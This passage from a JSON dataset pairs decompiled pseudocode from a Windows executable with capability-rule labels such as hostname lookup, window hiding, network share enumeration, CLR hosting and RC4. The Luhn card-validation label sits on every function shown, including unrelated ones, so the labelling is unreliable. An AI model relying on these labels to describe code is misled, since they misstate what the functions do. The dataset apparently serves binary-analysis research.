fcn.00405800();\n        }\n        else {\n            uStack788 = 0x463ff8;\n            fcn.00405800();\n        }\n        iVar1 = fcn.0040a450();\n    }\n    *in_FS_OFFSET = uStack788;\n    puStack780 = 0x463f82;\n    fcn.0040a474();\n    puStack780 = var_8h;\n    uStack784 = 0x464010;\n    uStack788 = var_ch;\n    fcn.00405800();\n    *in_FS_OFFSET = uStack788;\n    puStack780 = 0x463fdc;\n    uStack784 = 0x463fb6;\n    fcn.00405490();\n    uStack784 = 0x463fc7;\n    fcn.00405fcc();\n    uStack784 = 0x463fd4;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 810
    },
    "00464104": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.00464104(void)\n\n{\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0x10;\n    sub.kernel32.dll_GetComputerNameA(auStack24, &uStack28);\n    fcn.004056dc();\n    return;\n}\n",
        "token_count": 67
    },
    "00464280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00464280(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4642a4, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x4642b4, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 90
    },
    "00465158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465158(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint pszPath;\n    uint pidl;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    puStack312 = 0x46518d;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack312 = 0x465195;\n    fcn.004058ec();\n    puStack312 = 0x46519d;\n    fcn.004058ec();\n    uStack316 = 0x4652c6;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack312 = &stack0xfffffffc;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0, 0x10, &fcn.00465158::pidl);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(pidl, &fcn.00465158::pszPath);\n        fcn.0042b5f0();\n        fcn.0040713c();\n        uVar2 = fcn.004058fc();\n        (**(*var_14h + 0x1c))(var_14h, uVar2);\n        uVar2 = fcn.004058fc();\n        (**(*var_14h + 0x50))(var_14h, uVar2);\n        (**(*var_14h + 0x3c))(var_14h, 5);\n        fcn.004056dc();\n        fcn.00405800(0x4652f8, var_8h, 0x4652ec, 0);\n        uVar2 = fcn.004063bc(0xffffffff);\n        fcn.0040713c(uVar2);\n        (**(_pe_dos_header + 0x18))(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004070f8(0x4652cd);\n    fcn.0040546c();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 598
    },
    "0046548c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0046548c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x4656ec;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046548c::var_20h;\n    var_24h = 0x4654b3;\n    var_ch = unaff_EBX;\n    iVar2 = fcn.004032e8();\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_24h = 0x4654cb;\n        fcn.00403348();\n        var_24h = 0x4654d3;\n        var_4h = fcn.004058fc();\n    }\n    var_24h = 0x4654dd;\n    fcn.0040546c();\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = NULL;\n    var_24h = &fcn.0046548c::var_18h;\n    var_28h = &fcn.0046548c::var_14h;\n    var_2ch = &fcn.0046548c::var_10h;\n    var_30h = 0xffffffff;\n    var_34h = &fcn.0046548c::var_8h;\n    var_38h = 0;\n    var_3ch = var_4h;\n    var_40h = 0x465509;\n    iVar2 = sub.netapi32.dll_NetShareEnum();\n    if (iVar2 == 0) {\n        iVar2 = var_10h;\n        if (0 < var_10h) {\n            do {\n                iStack76 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb4;\n                iStack72 = var_4h;\n                var_40h = &stack0xfffffffc;\n                iVar1 = sub.netapi32.dll_NetShareGetInfo();\n                if (iVar1 == 0) {\n                    fcn.00405664();\n                    fcn.00405738();\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x465704;\n                    uVar3 = *(var_ch + 4);\n                    uVar5 = 0;\n                    fcn.00409dd4(uVar3);\n                    fcn.00405800(var_24h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405664(0x465704, *in_EAX);\n                    fcn.00405800(var_28h);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x465704;\n                    uVar3 = *(var_ch + 0xc);\n                    uVar5 = 0;\n                    fcn.00409dd4(uVar3);\n                    fcn.00405800(var_2ch, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x465704;\n                    uVar3 = *(var_ch + 0x10);\n                    uVar5 = 0;\n                    fcn.00409dd4(uVar3);\n                    fcn.00405800(var_30h, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x465704;\n                    uVar3 = *(var_ch + 0x14);\n                    uVar5 = 0;\n                    fcn.00409dd4(uVar3);\n                    fcn.00405800(var_34h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405664(0x465704, *in_EAX);\n                    fcn.00405800(var_38h);\n                    fcn.00405664(0x465704, *in_EAX);\n                    fcn.00405800(var_3ch);\n                    fcn.00409dd4(*(var_ch + 0x20));\n                    iStack72 = 0x465710;\n                    fcn.00405800();\n                }\n                iStack76 = var_ch;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = iStack76;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        var_3ch = var_8h;\n        iStack72 = 0x4656d1;\n        sub.netapi32.dll_NetApiBufferFree();\n    }\n    *in_FS_OFFSET = var_3ch;\n    var_34h = 0x4656f3;\n    var_38h = 0x4656eb;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1365
    },
    "0046575c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046575c(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x465775;\n    fcn.004058ec();\n    puStack28 = 0x46577d;\n    fcn.004058ec();\n    uStack32 = 0x46580c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420f38();\n    piVar1 = fcn.00404610();\n    fcn.00409e54();\n    fcn.00465714();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042164c();\n    (**(*piVar1 + 0x1c))();\n    fcn.00420fe4();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x465813;\n    uStack32 = 0x46580b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 298
    },
    "00465bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465bfc(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x465c13;\n    fcn.004058ec();\n    puStack24 = 0x465c1b;\n    fcn.004058ec();\n    puStack24 = 0x465c23;\n    fcn.004058ec();\n    puStack24 = 0x465c2b;\n    fcn.004058ec();\n    uStack28 = 0x465cd7;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x465c45;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420f38();\n    puStack36 = 0x465c50;\n    fcn.00409e54();\n    puStack36 = 0x465c55;\n    fcn.00465714();\n    uStack40 = 0x465cad;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00409e54();\n    fcn.00421954();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x465cb4;\n    uStack40 = 0x465ca4;\n    fcn.00420fe4();\n    uStack40 = 0x465cac;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 429
    },
    "00465ce4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465ce4(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x465cfb;\n    fcn.004058ec();\n    puStack24 = 0x465d03;\n    fcn.004058ec();\n    puStack24 = 0x465d0b;\n    fcn.004058ec();\n    puStack24 = 0x465d13;\n    fcn.004058ec();\n    uStack28 = 0x465db8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x465d2d;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420f38();\n    puStack36 = 0x465d38;\n    fcn.00409e54();\n    puStack36 = 0x465d3d;\n    fcn.00465714();\n    uStack40 = 0x465d8e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218ac();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x465d95;\n    uStack40 = 0x465d85;\n    fcn.00420fe4();\n    uStack40 = 0x465d8d;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 425
    },
    "00465dc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465dc8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x465ddf;\n    fcn.004058ec();\n    puStack24 = 0x465de7;\n    fcn.004058ec();\n    puStack24 = 0x465def;\n    fcn.004058ec();\n    puStack24 = 0x465df7;\n    fcn.004058ec();\n    uStack28 = 0x465e9c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x465e11;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00420f38();\n    puStack36 = 0x465e1c;\n    fcn.00409e54();\n    puStack36 = 0x465e21;\n    fcn.00465714();\n    uStack40 = 0x465e72;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x465e79;\n    uStack40 = 0x465e69;\n    fcn.00420fe4();\n    uStack40 = 0x465e71;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 421
    },
    "00466c74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466c74(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x466c8d;\n    fcn.004058ec();\n    puStack28 = 0x466c95;\n    fcn.004058ec();\n    puStack28 = 0x466c9d;\n    fcn.004058ec();\n    uStack32 = 0x466d22;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420f38();\n    fcn.00405894();\n    fcn.00405894();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004215c4();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x466d29;\n    uStack32 = 0x466d21;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 269
    },
    "004670d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004670d8(void)\n\n{\n    int32_t *piVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puStack20 = 0x4670ec;\n    fcn.004058ec();\n    uStack24 = 0x46714c;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00405dc8();\n    fcn.0045def4(0, var_8h);\n    piVar1 = var_ch;\n    (**(*var_ch + 0x4c))();\n    fcn.00407208();\n    *in_FS_OFFSET = piVar1;\n    fcn.004070f8(0x467153);\n    fcn.00405c48();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 256
    },
    "004674e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.004674e0(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x4674fa;\n    fcn.004058ec();\n    var_10h = 0x467615;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004674e0::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.004070f8();\n    fcn.0045def4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.00407208();\n    fcn.00407110();\n    piVar3 = fcn.004070f8();\n    uVar2 = fcn.00405c48();\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.00407208();\n    fcn.00405dc8(piVar1);\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.00407208();\n    fcn.00407110();\n    fcn.004063dc(0, var_8h, 0x467620, var_ch);\n    *in_FS_OFFSET = piVar3;\n    fcn.004070f8(0x46761c);\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 589
    },
    "0046762c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.0046762c(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x467646;\n    fcn.004058ec();\n    var_10h = 0x46775f;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046762c::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.004070f8();\n    fcn.0045def4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.00407208();\n    fcn.00407110();\n    piVar3 = fcn.004070f8();\n    uVar2 = fcn.00405c48();\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.00407208();\n    fcn.00405dc8(piVar1);\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.00407208();\n    fcn.00407110();\n    fcn.004063dc(0, var_ch, 0x46776c, 0xffffffff);\n    *in_FS_OFFSET = piVar3;\n    fcn.004070f8(0x467766);\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 588
    },
    "00467778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00467778(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x467792;\n    fcn.004058ec();\n    var_10h = 0x4678ab;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00467778::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.004070f8();\n    fcn.0045def4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.00407208();\n    fcn.00407110();\n    piVar3 = fcn.004070f8();\n    uVar2 = fcn.00405c48();\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.00407208();\n    fcn.00405dc8(piVar1);\n    fcn.0045def4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.00407208();\n    fcn.00407110();\n    fcn.004063dc(0, var_ch, 0x4678b8, 0);\n    *in_FS_OFFSET = piVar3;\n    fcn.004070f8(0x4678b2);\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.004070f8();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 588
    },
    "004679cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004679cc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack28 = 0x4679e7;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack32 = 0x467a93;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x467a67;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h = &fcn.004679cc::var_8h;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040eeb8(arg_8h, *0x467aa4);\n    fcn.00405504();\n    sub.user32.dll_ShowWindow();\n    sub.user32.dll_SetForegroundWindow();\n    iVar2 = 1;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if (iVar1 < iVar2) break;\n        fcn.00467918();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = arg_8h;\n    iStack48 = 0x467a9a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 414
    },
    "00468190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00468190(void)\n\n{\n    sub.winmm.dll_mciSendStringA(0x4681a0, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "0046856c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046856c(uint noname_0, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x46869f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if ((0 < arg_ch) && (-1 < arg_ch + -1)) {\n        uVar1 = arg_ch == 0;\n        do {\n            fcn.00405664();\n            fcn.00405664();\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00405664(*0x4987b0);\n                uStack52 = 0x4686cc;\n                fcn.00405800();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00405664(*0x4987b0);\n                uStack52 = 0x4686cc;\n                fcn.00405800();\n            }\n            fcn.00405894();\n            if (uVar1) {\n                fcn.00405664(*0x4987b0);\n                uStack52 = 0x4686cc;\n                fcn.00405800();\n            }\n            arg_ch = arg_ch + -1;\n            uVar1 = arg_ch == 0;\n        } while (!uVar1);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4686a6;\n    uStack48 = 0x468691;\n    fcn.00405490();\n    uStack48 = 0x46869e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 459
    },
    "00468714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00468714(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.004056dc();\n    }\n    else {\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0046ac3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0046ac3c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = *(in_EAX + 0x28) * 2;\n    *(*(in_EAX + 0x40) + -2 + *(in_EAX + 0x48) * 2) = 0;\n    fcn.00469ca0(*(in_EAX + 0x40), 0, (*(in_EAX + 0x48) + -1) * 2);\n    *(in_EAX + 0x7c) = *(*(in_EAX + 0x80) * 0xc + 0x4919c6);\n    *(in_EAX + 0x88) = *(*(in_EAX + 0x80) * 0xc + 0x4919c4);\n    *(in_EAX + 0x8c) = *(*(in_EAX + 0x80) * 0xc + 0x4919c8);\n    *(in_EAX + 0x78) = *(*(in_EAX + 0x80) * 0xc + 0x4919ca);\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x70) = 0;\n    *(in_EAX + 0x74) = 2;\n    *(in_EAX + 0x5c) = 2;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 374
    },
    "0046b8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046b8f0(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    puVar1 = in_EAX + 0x90;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x11e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x984;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x1e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0xa78;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x13);\n    *(in_EAX + 0x490) = 1;\n    *(in_EAX + 0x16a8) = 0;\n    *(in_EAX + 0x16a4) = 0;\n    *(in_EAX + 0x16ac) = 0;\n    *(in_EAX + 0x169c) = 0;\n    return;\n}\n",
        "token_count": 325
    },
    "0046b95c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b95c(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iStack24;\n    \n    iVar5 = *(in_EAX + 0xb58 + param_1 * 4);\n    puVar1 = param_2 + iVar5 * 4;\n    iStack24 = param_1;\n    while (iVar7 = iStack24 * 2,  iVar7 <= *(in_EAX + 0x144c)) {\n        if ((iVar7 < *(in_EAX + 0x144c)) &&\n           ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) < *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) ||\n            ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) == *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) &&\n             (uVar3 = *(in_EAX + 0x1454 + *(in_EAX + 0xb5c + iStack24 * 8)), \n             puVar2 = in_EAX + 0x1454 + *(in_EAX + 0xb58 + iStack24 * 8),  uVar3 < *puVar2 || uVar3 == *puVar2)))))) {\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = *(param_2 + *(in_EAX + 0xb58 + iVar7 * 4) * 4);\n        if ((*puVar1 <= uVar4 && uVar4 != *puVar1) ||\n           ((iVar6 = *(in_EAX + 0xb58 + iVar7 * 4),  *(param_2 + iVar6 * 4) == *puVar1 &&\n            (uVar3 = *(in_EAX + 